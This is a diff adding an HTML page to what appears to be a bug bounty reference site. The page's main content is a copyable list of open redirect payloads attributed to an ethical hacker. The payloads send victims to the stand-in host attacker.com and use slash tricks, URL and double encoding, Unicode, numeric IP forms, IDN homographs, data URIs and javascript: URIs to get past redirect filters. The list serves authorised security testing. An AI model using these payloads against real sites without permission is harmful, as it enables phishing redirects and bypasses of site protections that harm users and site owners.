@@ -1,0 +1,163 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>TamilsevanS Open Redirect - Bug Bounty Hub</title>
+    <link rel="stylesheet" href="../style.css">
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
+</head>
+<body>
+    <nav class="navbar">
+        <div class="nav-container">
+            <a href="../index.html" class="nav-logo">
+                <img src="../logo/logo.png" alt="BugBounty Hub">
+            </a>
+            <button class="nav-toggle" id="navToggle"><i class="fas fa-bars"></i></button>
+            <ul class="nav-menu" id="navMenu">
+                <li><a href="../index.html" class="nav-link">Home</a></li>
+                <li class="dropdown">
+                    <a href="#" class="nav-link">Vulnerabilities <i class="fas fa-chevron-down"></i></a>
+                    <ul class="dropdown-menu">
+                        <li><a href="../manual-open-redirect.html"><i class="fas fa-external-link-alt"></i> Manual Open Redirect</a></li>
+                        <li><a href="../open-redirect.html"><i class="fas fa-robot"></i> Automated Open Redirect</a></li>
+                        <li><a href="../xss.html"><i class="fas fa-bug"></i> XSS</a></li>
+                        <li><a href="../blind-xss.html"><i class="fas fa-eye-slash"></i> Blind XSS</a></li>
+                        <li><a href="../sqli.html"><i class="fas fa-database"></i> SQL Injection</a></li>
+                        <li><a href="../idor.html"><i class="fas fa-id-card"></i> IDOR</a></li>
+                        <li><a href="../lfi.html"><i class="fas fa-folder-open"></i> LFI</a></li>
+                        <li><a href="../cmdi.html"><i class="fas fa-terminal"></i> Command Injection</a></li>
+                        <li><a href="../subdomain-takeover.html"><i class="fas fa-globe"></i> Subdomain Takeover</a></li>
+                        <li><a href="../cors.html"><i class="fas fa-exchange-alt"></i> CORS</a></li>
+                        <li><a href="../csp-guide.html"><i class="fas fa-shield-alt"></i> CSP Guide</a></li>
+                        <li><a href="../xxe.html"><i class="fas fa-file-code"></i> XXE</a></li>
+                        <li><a href="../ssti.html"><i class="fas fa-file-alt"></i> SSTI</a></li>
+                        <li><a href="../crlf.html"><i class="fas fa-code"></i> CRLF Injection</a></li>
+                        <li><a href="../ssrf-payloads.html"><i class="fas fa-server"></i> SSRF Payloads</a></li>
+                        <li><a href="../race-conditions.html"><i class="fas fa-stopwatch"></i> Race Conditions</a></li>
+                        <li><a href="../poisoning.html"><i class="fas fa-bolt"></i> Cache Poisoning</a></li>
+                        <li><a href="../information-disclosure.html"><i class="fas fa-eye"></i> Info Disclosure</a></li>
+                        <li><a href="../host-header-injection.html"><i class="fas fa-globe-americas"></i> Host Header</a></li>
+                        <li><a href="../header-injection.html"><i class="fas fa-heading"></i> Header Injection</a></li>
+                        <li><a href="../html-injection.html"><i class="fas fa-code"></i> HTML Injection</a></li>
+                        <li><a href="../directory-traversal.html"><i class="fas fa-folder"></i> Directory Traversal</a></li>
+                        <li><a href="../wordpress.html"><i class="fab fa-wordpress"></i> WordPress</a></li>
+                        <li><a href="../spring-boot.html"><i class="fas fa-leaf"></i> Spring Boot</a></li>
+                    </ul>
+                </li>
+                <li class="dropdown">
+                    <a href="#" class="nav-link">Tools <i class="fas fa-chevron-down"></i></a>
+                    <ul class="dropdown-menu">
+                        <li><a href="../useful-tools.html"><i class="fas fa-toolbox"></i> Recon Tools</a></li>
+                        <li><a href="../nuclei.html"><i class="fas fa-rocket"></i> Nuclei</a></li>
+                    </ul>
+                </li>
+                <li><a href="../about.html" class="nav-link">About</a></li>
+            </ul>
+        </div>
+    </nav>
+
+    <header class="page-header">
+        <div class="breadcrumb">
+            <a href="../index.html">Home</a>
+            <i class="fas fa-chevron-right"></i>
+            <a href="../payloads.html">Payloads</a>
+            <i class="fas fa-chevron-right"></i>
+            <span>TamilsevanS-OpenRedirect-Payloads.txt</span>
+        </div>
+        <h1><i class="fas fa-external-link-alt"></i> TamilsevanS Open Redirect</h1>
+        <p>Open redirect payloads by TamilsevanS.</p>
+    </header>
+
+    <section class="content-section">
+        <div class="container">
+            <div class="content-card">
+                <h2><i class="fas fa-info-circle"></i> Author</h2>
+                <p><strong>Tamilsevan S</strong> - Cybersecurity | Ethical Hacker | Red Hat</p>
+                <p>Website: <a href="https://tamilselvan-official.web.app/" target="_blank" style="color: var(--accent-primary);">tamilselvan-official.web.app</a></p>
+            </div>
+
+            <div class="content-card">
+                <h2><i class="fas fa-file-alt"></i> File Contents</h2>
+                <div class="code-block" style="max-height: 600px; overflow-y: auto;">
+                    <button class="copy-btn">Copy All</button>
+                    <pre id="file-content"># ============================================
+# Author: Tamilsevan S
+# Role: Cybersecurity | Ethical Hacker | Red Hat
+# Website: https://tamilselvan-official.web.app/
+# ============================================
+# Open Redirect Payloads - Extended Collection
+# ============================================
+
+## Basic Redirects
+//attacker.com
+///attacker.com
+//attacker.com/%2f..
+///attacker.com/%2f..
+//attacker.com/
+///attacker.com/
+https://attacker.com
+http://attacker.com
+
+## Protocol Bypass
+HtTp://attacker.com
+hTTp://attacker.com
+hTTps://attacker.com
+
+## URL Encoding
+%2f%2fattacker.com
+%2f%2f%2fattacker.com
+%2f%2fattacker.com%2f%2f
+%2f%5cattacker.com
+%2f%5c%2fattacker.com
+
+## Double URL Encoding
+%252f%252fattacker.com
+%252f%252f%252fattacker.com
+
+## Unicode Encoding
+%u2216%u2216attacker.com
+%u002f%u002fattacker.com
+%e2%89%88attacker.com
+
+## IP Address Bypass
+//2130706433/  # 127.0.0.1
+//3232235521/  # 192.168.0.1
+//3232235777/  # 192.168.1.1
+//0x7f000001/  # 127.0.0.1
+//017700000001/  # 127.0.0.1
+
+## IDN Homograph
+//www.xn--attacker-wmd.com
+//www.xn--80ak6aa92e.com
+
+## Data URI Redirect
+data:text/html,&lt;script&gt;window.location="https://attacker.com"&lt;/script&gt;
+data:text/html;base64,PHNjcmlwdD53aW5kb3cubG9jYXRpb249Imh0dHBzOi8vYXR0YWNrZXIuY29tIjwvc2NyaXB0Pg==
+
+## JavaScript Redirect
+javascript:window.location="https://attacker.com"
+javascript:document.location="https://attacker.com"
+javascript:location.href="https://attacker.com"
+javascript:window.open("https://attacker.com")</pre>
+                </div>
+            </div>
+
+            <div class="content-card">
+                <h2><i class="fas fa-link"></i> Related</h2>
+                <a href="../tamilsevan-redirect.html" class="btn btn-primary">Open Redirect Main Page</a>
+                <a href="../open-redirect.html" class="btn btn-secondary" style="margin-left: 0.5rem;">Open Redirect Guide</a>
+            </div>
+        </div>
+    </section>
+
+    <footer class="footer">
+        <div class="container">
+            <p>&copy; 2026 Bug Bounty Hub. Open source security reference.</p>
+        </div>
+    </footer>
+
+    <div id="toast" class="toast">Copied to clipboard!</div>
+    <script src="../script.js"></script>
+</body>
+</html>
